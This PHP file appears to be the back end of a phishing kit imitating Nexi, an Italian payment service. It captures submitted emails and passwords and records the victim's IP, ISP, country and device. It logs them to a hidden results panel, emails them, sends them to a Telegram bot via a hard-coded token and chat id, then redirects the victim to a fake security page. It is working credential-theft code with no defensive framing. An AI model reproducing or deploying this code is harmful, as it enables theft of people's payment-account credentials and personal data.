<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['user']) and !empty($_POST['pass'])) {
        $_SESSION['pass'] = $_POST['pass'];
        
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        include('GET.IP.INFOS.php');
        include('../../BOTS/STRNG.php');

        $date = date("d/m/Y");
        $date_format = ("D|M|Y");

        // تنسيق النصوص بحيث فقط "user" و "pass" هما المحاطين بـ backticks
        $ATR480X = "•••••••••• 👑.❌ [ NEXI.ATR480X ] 👑.❌\n";
        $ATR480X .= "【 EMAIL  】   :  `".$_POST['user']."` \n";
		$ATR480X .= "【 ♛•🦅•▄︻テ══━一💥•🦅•♛ 】\n";
        $ATR480X .= "【 PASS 】   :  `".$_POST['pass']."` \n"; 
        $ATR480X .= "•••••••••• ℹ️ [ VICM.INFS ] ℹ️\n";
        $ATR480X .= "[ 🔎 - 🔌 ] *  =  $ip - $LOOKUP_ISP\n";
        $ATR480X .= "[ 🖥 ] *  =  $v_isp\n";
        $ATR480X .= "[ 🚩 ] *  =  $LOOKUP_COUNTRY - $LOOKUP_CNTRCODE\n";
        $ATR480X .= "[ 💻 - 🌐 ] *  =  $device_details\n";
        $ATR480X .= "[ 🔗 ] *  =  $url\n";
        $ATR480X .= "[ 📆 ] *  =  $date - $date_format\n";
        $ATR480X .= "•••••••••• 🇮🇹🇮🇹.[IT].🇮🇹🇮🇹\n";

        $file = fopen("../../PANEL/REZULTS.77T3V07V56s5j14kcWEm121WCL361xvGY5K775J05F3T7jJ215f4N88t2H4fS8XFNb1ij615127528m8xDv82CdQI4hK5T6876j2/REZULTS.php", "a+");
        fwrite($file, $ATR480X);
        fclose($file);

        $to = "";
        $subject = "[ LOG.RECEIVED ]";
        $headers = "From: [ NEXI.ATR480X ]<atr480x@atr480x.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
        mail($to, $subject, $ATR480X, $headers);

        $token = "7883633314:AAG9KKQAzEX_CdXiIhNXd8R5z0Aj866qQoA";
        
        // إرسال الرسالة باستخدام Markdown
        // التأكد من تنسيق URL بشكل صحيح
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1858722787&text=" . urlencode($ATR480X) . "&parse_mode=Markdown");

        header("Location: ../SISTEMA.DI.SICUREZZA/REDIRECT/EXAMPLE.php?client_id=$my_rand_strng");
    } else {
        header("Location: ?error=".md5($_GET['error']));
    }
}
?>